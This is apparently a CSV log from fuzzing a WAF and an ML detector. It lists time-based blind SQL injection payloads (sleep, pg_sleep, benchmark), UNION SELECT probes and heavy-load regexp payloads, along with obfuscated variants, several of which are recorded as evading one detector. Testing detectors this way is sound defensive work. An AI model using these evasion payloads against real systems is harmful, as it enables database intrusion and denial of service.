Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-12-17T22:42:39.335368,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,403,403,403,both_correct,"1   )    )    As sipp WHeRE  AND 24<>25   likE   0x7cf AND   (  SElEct * fROM   (  SeLECt  (  sleep  (  5   )    )
    )  fzno  )/*(*/ --",2024-12-17T22:42:45.805786,403,200,waf_correct_ml_incorrect,"1   )    )    aS sipp wheRe 
and 24<> ANd 1437!=1438   LIkE   0x7cf AND   (  sElEcT * FrOm   (  SelEcT /**/(  sleep  (  0x5   )    )
    )  fzno  )/*(*/ --",2024-12-17T22:42:53.305813,403,200,waf_correct_ml_incorrect,"1   )    )    As sipp WHere 
aNd  AnD 0x1<> And 1437 not like 'v3' LIKE 'v3'   Like   0x7cf aND   (  SELeCT * FROm   (  seLeCT  (  sleep  (
 0x5   )    )
    )  fzno  )/*(*/ --",2024-12-17T22:43:01.831926,403,200,waf_correct_ml_incorrect," OR 0=0x23cc   )    )    aS sipp WheRe  aND  and 0x1<> aND 1437 not like 'v3' likE 'v3'   lIkE   0x7cf aND   (  sEleCt * FROM   ( /**/SeleCT  (  sleep  (
 0x5   )    )
    )  fzno  )/*(*/ --",2024-12-17T22:43:11.268261,200,200,both_incorrect," or 0 liKE 0x23cc   )    )    AS sipp WHerE  aND  aNd 0x1<> aND (seLeCT (sELECT 1)) not like 'v3' LIkE 'v3'   like   0x7cf anD   (  selEct * frOm   ( /*|6299 NOT LIKE/**/6300*/SeLecT  (  sleep  (
 0x5   )    )     )  fzno  )/*(*/ --",2024-12-17T22:43:21.266794,200,403,waf_incorrect_ml_correct, OR 0 LiKE 0x23cc   )    )    aS sipp WhERE  AND  aNd 0x1 not like  And (SeleCt (sELecT  AND 1)) not like 'v3' LIKe 'v3'   lIke   0x7cf ANd   (  sElect * FROM   ( /*|'I' LIKE 'I' NOT LIKE/**/0x189c*/seLect  ( /*>Xw4*/sleep  (	 0x5   )    )     )  fzno  )/*(*/ --,2024-12-17T22:43:33.508407,200,200,both_incorrect," oR  anD 1 LIke 0x23cc   )    )    aS sipp WHerE  AND  and 0x1 not like  && (SelecT (sElEcT  anD (sELEcT 'T'='T'))) not like 'v3' lIKe 'v3'   liKe   0x7cf/**/aND   (  SELeCt * FRoM   ( /*|'I' LIKE 'I' NOT LIKE/*IB<t*/0x189c*/seLecT  ( /*>Xw4*/sleep  (
 0x5   )    )     )  fzno  )/*(*/ --",2024-12-17T22:43:46.884665,403,200,waf_correct_ml_incorrect," or  And (select (SEleCT '*'='*')) lIKE 0x23cc   )    )    As sipp where 
&&  And 0x1 not like  && (selEct (SELEct  aND (sElEct 'T'='T'))) not like 'v3' like 'v3'   lIKe   0x7cf/*Zw\*/AND   (  sElECt * fROm  /**/( /*|'I' LIKE 'I' NOT LIKE/**/0x189c*/sElECt  ( /*>Xw4*/sleep  (
 0x5   )    )     )  fzno  )/*(*/ --",2024-12-17T22:44:01.750777,403,403,both_correct," Or  AND (SelEct (selEct '*'='*')) LIke 0x23cc   )    )    as sipp WHeRE 
&&  anD 0x1 not like  && (SeLEcT (selEct /**/aNd (SEleCT 'T'='T'))) not like  and (SELECT 4079) LIKE 4079   LIkE   0x7cf/**/AND   (  SELECt * froM  /**/( /*|'I' LIKE 'I' NOT LIKE/*_&x$*/0x189c*/SELECT  ( /*>Xw4*/sleep  (
 0x5   )    )
    )  fzno  )/*(*/ --",2024-12-17T22:44:17.492784,403,403,both_correct," or  anD (sELEcT (selECt '*'='*')) Like 0x23cc   )    )    AS sipp WherE 
&&  AND 0x1 not like  && (sELEcT (SeLect /**/anD (select 'T'='T'))) not like  and (selEct (SELeCT 5247<>5248)) LIkE 0xfef   LIKe   0x7cf/**/ANd   (  SELeCt * froM /*@Xzj*//**/( /*|'I' LIKE 'I' NOT LIKE/**/0x189c*/select  ( /*>Xw4*/sleep  (
 0x5   )    )     )  fzno  )/*(*/ --",2024-12-17T22:44:34.369739,403,403,both_correct
2,2024-12-17T22:44:52.048145,tenuta,200,200,200,both_correct,tenuta,2024-12-17T22:44:52.467580,200,200,both_correct,tenuta,2024-12-17T22:44:53.876310,200,200,both_correct,tenuta,2024-12-17T22:44:55.308096,200,200,both_correct,tenuta,2024-12-17T22:44:56.742831,200,200,both_correct,tenuta,2024-12-17T22:44:58.178451,200,200,both_correct,tenuta,2024-12-17T22:44:59.587769,200,200,both_correct,tenuta,2024-12-17T22:45:00.993909,200,200,both_correct,tenuta,2024-12-17T22:45:02.428660,200,200,both_correct,tenuta,2024-12-17T22:45:03.854031,200,200,both_correct,tenuta,2024-12-17T22:45:05.287797,200,200,both_correct
3,2024-12-17T22:45:06.706540,valls,200,200,200,both_correct,valls,2024-12-17T22:45:07.078322,200,200,both_correct,valls,2024-12-17T22:45:08.420097,200,200,both_correct,valls,2024-12-17T22:45:09.780230,200,200,both_correct,valls,2024-12-17T22:45:11.153719,200,200,both_correct,valls,2024-12-17T22:45:12.538380,200,200,both_correct,valls,2024-12-17T22:45:13.897254,200,200,both_correct,valls,2024-12-17T22:45:15.282843,200,200,both_correct,valls,2024-12-17T22:45:16.685646,200,200,both_correct,valls,2024-12-17T22:45:18.058160,200,200,both_correct,valls,2024-12-17T22:45:19.435118,200,200,both_correct
4,2024-12-17T22:45:20.804569,"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",403,403,200,waf_correct_ml_incorrect,"1'   )    )     )   and char  (  (SELECT 111)  )  ||char  (  77  )  ||char  (  121  )  ||char  (	 88  )    =  regexp_substring/**/ (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,(SELECT 1)  )  ,'pj'!='pjL'  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",2024-12-17T22:45:34.733946,403,200,waf_correct_ml_incorrect,"1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  77  )  ||char  (  '	NSx' LIKE '	NSx'  )  ||char  (	 88  )    =  regexp_substring/* AND 1)f*/ (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char /**/(	 83  )  ,null  )  ,(SELECT 1)  )  ,'pj'!='pjL'  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",2024-12-17T22:45:50.426503,403,200,waf_correct_ml_incorrect,"1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  77  )  ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (	 'y' LIKE 'y'  )    =  regexp_substring/* AND 1)f*/ (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (   AND 1  )  ||char /**/(	 83  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /**/ (     (  'kpsg' like 'kpsg",2024-12-17T22:46:07.618443,403,403,both_correct,"1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  77  )  ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (	 'y' LIKE 'y'  )    =  regexp_substring/* AND 9389!=9390)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND 1  )  ||char /*,;*/(
  OR 0  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /**/ (     (/**/ 'kpsg' like 'kpsg",2024-12-17T22:46:25.910626,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  77  )/**/ ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )    =  regexp_substring/* AND  OR 0!=9390)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND '~'!='~b'  )  ||char /*,;*/(
  OR 0  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /**/ (     (/**/ 'kpsg' like 'kpsg",2024-12-17T22:46:44.993729,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  7287=7287  )/**/ ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )    =  regexp_substring/* AND  OR  AND 1!=0x24ae)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )/**/ ||char  (   AND '~'!='~b'  )  ||char /**/(
  OR 0  )  ,null  )  ,(SELECT 0x1) 	)  ,'pj'!='pjL'  )  ,null  )   and    (  /**/ (     (/**/ 'kpsg' like 'kpsg",2024-12-17T22:47:04.737128,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  7287= OR 3146 LIKE 3146  )/**/ ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )    =  regexp_substring/* AND  OR  AND 1!=0x24ae)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND '~'!='~b'  )  ||char /**/(   OR (SELECT 0)  )  ,null  )  ,(SELECT 0x1) 	)  ,'pj'!='pjL'  )  ,null  )   and    (  /*L|*/ (     (/**/ 'kpsg' like 'kpsg",2024-12-17T22:47:25.004395,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  7287= OR (SELECT 0x1) LIKE 3146  )/**/ ||char  (  '
NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )    =  regexp_substring/* AND  OR  AND 1!=0x24ae)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND '~'!='~b'  )  ||char /*k*/(   OR (SELECT 8090=8090)  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /*L|*/ (     (  'kpsg' like 'kpsg",2024-12-17T22:47:46.449693,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  (SELECT 7287)= OR (SELECT 0x1) LIKE 3146  )/**/ ||char  (/**/ '	NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )    =  regexp_substring/* AND  OR  AND 1!=0x24ae)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND '~'!='~b'  )  ||char /*v]bI*/(   OR (SELECT 1583=1583= AND 1)  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /*L|*/ (     (  'kpsg' like 'kpsg",2024-12-17T22:48:08.557574,403,403,both_correct,"0x1'   )    )     )   and char  (  (SELECT 0x6f)  )  ||char  (  (SELECT 0x1c77)= OR (SELECT 0x1) LIKE '+/|' LIKE '+/|'  )/*}E_*/ ||char  (/**/ '	NSx' LIKE '	NSx'  )  ||char  (  'y' LIKE 'y'  )	   =  regexp_substring/* AND  OR  AND (SELECT 1)!=0x24ae)f*/ (  repeat  (  left  (  crypt_key  (  char  (  0x41  )  ||char  (   AND '~'!='~b'  )  ||char  (   OR (SELECT 1583=1583= AND 1)  )  ,null  )  ,(SELECT 0x1)  )  ,'pj'!='pjL'  )  ,null  )   and    (  /*L|*/ (     (  'kpsg' like 'kpsg",2024-12-17T22:48:31.673413,403,403,both_correct
5,2024-12-17T22:48:55.683149,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",403,403,403,both_correct,"(sELEcT (sELECT/*&*/'H)' not like 'H)!'))""   )   	)     )   union all SELeCt null,null,null,null,null,null,null,null,null,null#",2024-12-17T22:48:59.967639,403,403,both_correct,"(SeLECT (SELEcT/**/'H)' not like 'H)!'))""   )   	) /**/   )	  union all SeLEct null,null,null,null,null,null,null,null,null,null#5p",2024-12-17T22:49:07.426132,403,403,both_correct,"(SELeCt (selECt/**/'H)' not like 'H)!'))""   )   	) /**/  /**/)	  union all	SELect null,null,null,null,null,null,null,null,null,null#5p",2024-12-17T22:49:14.813580,403,403,both_correct,"(sElect (SeLEct/**/'H)' not	like 'H)!'))""   )   	)    /*&&+M*/)	  union all	SeLECT null,null,null,null,null,null,null,null,null,null#5p",2024-12-17T22:49:22.381782,403,403,both_correct,"(sELeCt (sELECT 'H)' not	like 'H)!'))""   )   	)    /*&&+M*/)	 	union all	SELECt null,null,null,null,null,null,null,null,null,null#5pnA",2024-12-17T22:49:30.035659,403,403,both_correct,"(selecT (SELeCt 'H)' not	like 'H)!'))""   )/**/  	)    /*0x9*/)  	union all	SelEct null,null,null,null,null,null,null,null,null,null#5pnA",2024-12-17T22:49:37.859863,403,403,both_correct,"(seLECt (SElECT 'H)' not	like/**/'H)!'))""  
)/**/  	)    /*a_*/)  	union all	seleCT null,null,null,null,null,null,null,null,null,null#5pnA",2024-12-17T22:49:45.563786,403,200,waf_correct_ml_incorrect,"(seLECt (SElecT 'H)' not	like/*~C,)q*/'H)!'))""   )   	)    /**/)  	union all	SeLeCT null,null,null,null,null,null,null,null,null,null#5pnA",2024-12-17T22:49:53.282520,403,200,waf_correct_ml_incorrect,"(sELeCT (sELEct 'H)' not	like/*~C,)q*/'H)!'))"" /**/ )   	)    /**/)  	union all
SELECt null,null,null,null,null,null,null,null,null,null#5pnA&~",2024-12-17T22:50:01.270260,403,200,waf_correct_ml_incorrect,"(SeLecT (select 'H)' not	like/*~C,)q*/'H)!'))"" /**/ ) /**/ 	)    /**/)  	union
all
SelEct null,null,null,null,null,null,null,null,null,null#5pnA&~#",2024-12-17T22:50:09.100145,403,403,both_correct
6,2024-12-17T22:50:17.231161,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",403,403,200,waf_correct_ml_incorrect,"1%"" 
 )    )    aND 0x2192   LikE     (  SELecT  AND 1 From pg_sleep  (  '''<>''B'   )    ) /**/ --",2024-12-17T22:50:21.107732,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    )    AnD 0x2192   like/**/    (  seLect  aNd  && '\'!='\`' FrOM pg_sleep  (  '''<>''B'   )    ) /**/ --",2024-12-17T22:50:27.207636,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  And 0x2192   lIKe/*47b8)*/    (  sELecT  aND  && '\'!='\`' FrOM/**/pg_sleep  (  ''' NOT LIKE ''B'   )    ) /**/ --",2024-12-17T22:50:33.843514,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  anD 0x2192   lIkE/*47b8)*/	   (  seleCT  AnD  && '\'!='\`' FrOM/**/pg_sleep  (  ''' not like ''B'   )    ) /**//**/--",2024-12-17T22:50:41.166891,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  anD 0x2192   LiKe/*47b8)*/	   (  sELeCT  aNd  	aNd  '\'!='\`' FrOM/**/pg_sleep  (  ''' not like ''B'   )    )  /**/--",2024-12-17T22:50:48.594690,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  And 0x2192   likE/*47b8)*/	   (  SeLEcT  anD  	aNd  '\'!='\`' FrOM pg_sleep  (  ''' not like ''B'   )    )  /**/--",2024-12-17T22:50:56.314298,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  And 0x2192   liKe/*47b8)*/	   (  seLECt 
AnD  	aND  '\'!='\`' FrOM pg_sleep  (  ''' not like ''B'/**/  )    )  /**/--",2024-12-17T22:51:03.599303,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  AND 0x2192 /**/ liKe/*47b8)*/	   (  SeLEct 
anD   aND  '\'!='\`' FrOM pg_sleep  (  ''' not like ''B'/**/  )    )  /**/--",2024-12-17T22:51:11.088033,403,200,waf_correct_ml_incorrect,"0x1%"" 	 )    ) 	  ANd 0x2192 /**/ LIKe/*47b8)*/	   (  SeLect 
AnD   aND  '\'!='\`' FrOM pg_sleep  (  ''' not like ''B'/**/  )  	 )   --",2024-12-17T22:51:18.838184,403,200,waf_correct_ml_incorrect,"0x1%"" 	 ) 	  ) 	  AnD 0x2192 /**/ liKE/*47b8)*/	   (  select 
and   and  '\'!='\`' FrOM pg_sleep  (  ''' not like ''B'   )  	 )   --",2024-12-17T22:51:26.458370,403,200,waf_correct_ml_incorrect
7,2024-12-17T22:51:33.799305,recomendaci$n,200,200,200,both_correct,recomendaci$n,2024-12-17T22:51:34.525959,200,200,both_correct,recomendaci$n,2024-12-17T22:51:36.260067,200,200,both_correct,recomendaci$n,2024-12-17T22:51:37.982389,200,200,both_correct,recomendaci$n,2024-12-17T22:51:39.720248,200,200,both_correct,recomendaci$n,2024-12-17T22:51:41.477380,200,200,both_correct,recomendaci$n,2024-12-17T22:51:43.206316,200,200,both_correct,recomendaci$n,2024-12-17T22:51:44.971849,200,200,both_correct,recomendaci$n,2024-12-17T22:51:46.739537,200,200,both_correct,recomendaci$n,2024-12-17T22:51:48.479845,200,200,both_correct,recomendaci$n,2024-12-17T22:51:50.232816,200,200,both_correct
8,2024-12-17T22:51:51.980031,5mpe92onal,200,200,200,both_correct,5mpe92onal,2024-12-17T22:51:52.575158,200,200,both_correct,5mpe92onal,2024-12-17T22:51:54.195644,200,200,both_correct,5mpe92onal,2024-12-17T22:51:55.811815,200,200,both_correct,5mpe92onal,2024-12-17T22:51:57.385016,200,200,both_correct,5mpe92onal,2024-12-17T22:51:59.201228,200,200,both_correct,5mpe92onal,2024-12-17T22:52:00.885295,200,200,both_correct,5mpe92onal,2024-12-17T22:52:02.536636,200,200,both_correct,5mpe92onal,2024-12-17T22:52:04.152121,200,200,both_correct,5mpe92onal,2024-12-17T22:52:05.749358,200,200,both_correct,5mpe92onal,2024-12-17T22:52:07.336875,200,200,both_correct
9,2024-12-17T22:52:08.933097,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",403,403,200,waf_correct_ml_incorrect,"1  )   wherE (SEleCT (SELECT 1)) 
 like   '?' NOT LIKE '?(' oR 8466  =  benchmark  (  5000000,md5  (  0x694a4745 /*,L*/ )    )   --",2024-12-17T22:52:13.437317,200,403,waf_incorrect_ml_correct,"'l\'!='l\?'  )   WHERE
(SelEct (SELeCt 1)) 
 LIke   '?' NOT LIKE '?(' oR  oR 0   lIKE   benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:52:20.730302,403,200,waf_correct_ml_incorrect,"'l\'!='l\?'  )   WHERE
(SelEct (SELeCt (SELECT 1))) 
 LIke   '?' NOT LIKE '?(' Or  OR  OR '[' NOT LIKE	'[&'   LIKe /*q<*/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:52:28.582918,403,403,both_correct,"'l\'!='l\?'  )   WHERE
(SelEct (SELeCt (SELECT (SELECT 2494)!= AND 1))) 
 LIke  /**/'?' NOT LIKE '?(' Or  OR  OR '[' NOT LIKE '[&'   LIke /**/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:52:38.328948,403,403,both_correct,"'l\'!='l\?'  )   WHERE
(SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;3')!= AND (SELECT 1)))) 
 LIke   '?' NOT LIKE '?('
Or  OR  OR '[' NOT LIKE '[&'   LIKe /**/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:52:48.797562,403,403,both_correct,"'l\'!='l\?' /**/)   WHERE
(SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;'['='['')!= AND (SELECT (SELECT 0x1))))) 
 LIke   '?' NOT LIKE '?('	Or  OR  OR '[' NOT LIKE '[&'   LIke /*4qJ5*/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:53:00.567064,403,403,both_correct,"'l\'!='l\?'  )   WHERE (SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;'[' like '['')!= AND (SELECT (SELECT 0x1))))) 
 LIke   '?' NOT LIKE '?('	Or  OR  OR '[' NOT LIKE '[&'   LIkE /*R*/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:53:13.077713,200,403,waf_incorrect_ml_correct,"'l\'!='l\?'  )   WHERE (SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;'[' lIkE '['')!= AND (SELECT (SELECT 0x1))))) 
 LIke   '?' NOT LIKE '?(' Or  OR  OR '[' NOT LIKE '[&'   LiKe/**//*R*/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:53:25.766506,200,403,waf_incorrect_ml_correct,"'l\'!='l\?'  )   WHERE (SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;'[' Like '['')!= AND (SELECT (SELECT 0x1))))) 	 LIke   '?' NOT LIKE '?(' Or  OR  OR '[' NOT LIKE '[&'   liKe /**/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:53:38.350215,200,403,waf_incorrect_ml_correct,"'l\'!='l\?'  )   WHERE (SelEct (SELeCt (SELECT (SELECT  AND 'yL;'!='yL;'[' like '['')!= AND (SELECT (SELECT 0x1))))) 
 LIke/*0x5~m*/  '?' NOT LIKE '?(' Or  OR  OR '[' NOT LIKE '[&'   LIke /**/ benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )   --",2024-12-17T22:53:51.040221,200,403,waf_incorrect_ml_correct
10,2024-12-17T22:54:03.861669,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",403,403,200,waf_correct_ml_incorrect,"1""   )   /**/)    and char  (  120  ) 	||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  , AND (SELECT 3320<>3321)  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:54:14.847451,403,403,both_correct,"1""   )   /**/)    and char  (  120  ) 
||char  (  106  )  ||char  (  2716 LIKE 2716  )  ||char  ( /**/85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  , AND (SELECT (SELECT 3320)<>(SELECT 1))  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:54:27.570739,403,403,both_correct,"'F' not like 'F5'""   )   /**/)    and char  (  120  ) 	||char  (  106  )  ||char  (  2716 LIKE  OR 0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  , AND (SELECT (SELECT (SELECT 3320))<>(SELECT 1))  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:54:42.028500,403,403,both_correct,"'F' not like 'F5'""   )   /*?*/)    and char  (  120  ) 
||char  (  (SELECT 106)  )  ||char  (  2716 LIKE  OR 0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  (SELECT 1)  )  , AND (SELECT (SELECT (SELECT 3320))<>(SELECT 9109 IN (9108,9109,9110)))  )  ,5000000000  )  ,null  )   and/**/   (    (   ""oxvs"" like ""oxvs",2024-12-17T22:54:57.298722,403,403,both_correct,"'F' not like 'F5'""   )   /*&Ntl*/)    and char  (  120  ) 
||char  (  (SELECT 106)  )  ||char  (  2716 LIKE  OR 7701<>7702  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right 	(  char  (  (SELECT 1) /**/)  , AND (SELECT (SELECT (SELECT 3320))<>(SELECT 9109 IN (9108,(SELECT  AND 1),9110)))  )  ,5000000000  )  ,null  )   and/**/   (    (   ""oxvs"" like ""oxvs",2024-12-17T22:55:14.842195,403,403,both_correct,"'F' not like 'F5'""   )   /*&Ntl*/)    and char  (  120
 ) 
||char  (  (SELECT 106)  )  ||char  (  2716 LIKE  OR 7701<>5611!= OR 0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right 	(  char  (  (SELECT 1) /**/)  , AND (SELECT (SELECT (SELECT 3320))<>(SELECT 9109 IN (9108,(SELECT  AND 1),0x2396)))  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:55:33.607859,403,403,both_correct,"'F' not like 'F5'""   )   /* 3r*/)    and char  (  120
 ) 
||char  (  (SELECT 106)  )  ||char  (  2716 LIKE  OR (SELECT 7701)<>5611!= OR 0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right 	(  char  (  (SELECT 1) /**/)  , AND (SELECT (SELECT (SELECT/**/3320))<>(SELECT 9109 IN ( OR 0,(SELECT  AND 1),0x2396)))  )  ,'L'
NOT LIKE 'L7'  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:55:52.723135,403,403,both_correct,"'F' not like 'F5'""   )   /* 3r*/)    and char  (  120
 ) 
||char  (  (SELECT 0x6a)  )  ||char  (  2716 LIKE  OR (SELECT '~'!='~f')<> OR 0!= OR 0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  (SELECT 1)  )  , AND (SELECT (SELECT (SELECT/**/3320))<>(SELECT 9109 IN ( OR 0,(SELECT  AND 1),0x2396)))  )  ,'L'
NOT LIKE 'L7'  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:56:12.448018,403,403,both_correct,"'F' not like 'F5'""   )   /**/)    and char  (  120
 ) 
||char  (  (SELECT 0x6a)  )  ||char  (  2716 LIKE  OR (SELECT '~'!='~f')<> OR 0!= OR 0x0  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  ( 	char  (  (SELECT 1)  )  , AND (SELECT (SELECT (SELECT  AND 1))<>(SELECT 9109 IN ( OR 0,(SELECT  AND 3860!=3861),0x2396)))  )  ,'L'
NOT LIKE 'L7'  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:56:32.530562,403,403,both_correct,"'F' not like 'F5'""   )   /**/)    and char  (  120
 ) 
||char  (  (SELECT 0x6a)  )  ||char  (  'd'<>'dp' LIKE  OR (SELECT '~'!='~f')<> OR 0!= OR 0x0  )  ||char  (  0x55  )    =  regexp_substring  ( /**/repeat  (  right  ( 	char  (  (SELECT 1)  )  , AND (SELECT (SELECT (SELECT  AND 1))<>(SELECT  OR 0 IN ( OR 0,(SELECT  AND 3860!=3861),0x2396)))  )  ,'L'
NOT LIKE 'L7'  )  ,null 
)   and    (    (   ""oxvs"" like ""oxvs",2024-12-17T22:56:52.962629,403,403,both_correct
